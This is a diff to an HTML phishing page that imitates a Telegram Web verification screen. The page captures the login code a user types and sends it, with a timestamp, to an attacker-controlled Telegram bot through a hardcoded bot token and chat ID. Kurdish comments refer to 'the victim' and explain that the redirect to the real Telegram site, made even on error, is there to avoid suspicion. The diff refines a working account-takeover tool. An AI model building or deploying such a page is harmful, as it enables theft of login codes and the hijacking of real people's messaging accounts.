@@ -6,47 +6,52 @@
     <title>Telegram Web - Verification</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f4f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 320px; text-align: center; }
-        h2 { color: #222; margin-bottom: 10px; }
-        p { color: #707579; font-size: 14px; margin-bottom: 25px; }
-        input[type="text"] { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 5px; font-size: 18px; text-align: center; letter-spacing: 5px; box-sizing: border-box; }
-        button { background-color: #3390ec; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-size: 16px; cursor: pointer; }
+        .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 340px; text-align: center; box-sizing: border-box; }
+        h2 { color: #222; margin-bottom: 10px; font-size: 24px; }
+        p { color: #707579; font-size: 14.5px; margin-bottom: 25px; line-height: 1.4; }
+        input[type="text"] { width: 100%; padding: 14px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 8px; font-size: 20px; text-align: center; letter-spacing: 8px; font-weight: bold; outline: none; }
+        input[type="text"]:focus { border: 2px solid #3390ec; }
+        button { background-color: #3390ec; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background-color: #2b7dcb; }
     </style>
 </head>
 <body>
+
     <div class="login-box">
         <h2>Enter Code</h2>
-        <p>We've sent an SMS with an activation code to your phone.</p>
+        <p>We've sent an activation code to your Telegram app or via SMS.</p>
         
         <form id="otpForm">
-            <input type="text" id="otp_code" placeholder="-----" maxlength="5" required>
+            <input type="text" id="otp_code" placeholder="-----" maxlength="5" required autocomplete="off">
             <button type="submit">CONFIRM</button>
         </form>
     </div>
 
     <script>
-        // لێرە تۆکن و ئایدی خۆت دابنێ
-       const token = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
-       const chatID = "6679834643";
-نموونەیە، هی خۆت دابنێ
+        // دڵنیابە ئەم Token و ChatIDـە ڕێک وەک هی index.html بێت
+        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
+        const chatId = "6679834643";
 
         document.getElementById('otpForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const code = document.getElementById('otp_code').value;
-            const message = "🎯 OTP CODE RECEIVED!\n\n🔑 Code: " + code;
+            const message = "🎯 OTP CODE RECEIVED!\n\n🔑 Code: " + code + "\n⏰ Time: " + new Date().toLocaleString();
 
-            // ناردنی کۆد بۆ تێلگرام
+            // ناردنی کۆدەکە بۆ تێلگرامەکەت
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: chatId, text: message })
             }).then(() => {
-                // دوای ناردنی کۆدەکە، قوربانی دەبات بۆ سایتی فەرمی تێلگرام تا گومانی لا دروست نەبێت
+                // دوای ناردنی کۆدەکە، قوربانی دەبات بۆ سایتی فەرمی تێلگرام بۆ ئەوەی گومان نەکات
                 window.location.href = "https://web.telegram.org/k/";
             }).catch(err => {
-                console.error("Error sending data:", err);
+                console.error("Error:", err);
+                // تەنانەت ئەگەر ئیرۆریش هەبوو، هەر لای قوربانی ڕێدایرێکت بکە
+                window.location.href = "https://web.telegram.org/k/";
             });
         });
     </script>
+
 </body>
 </html>
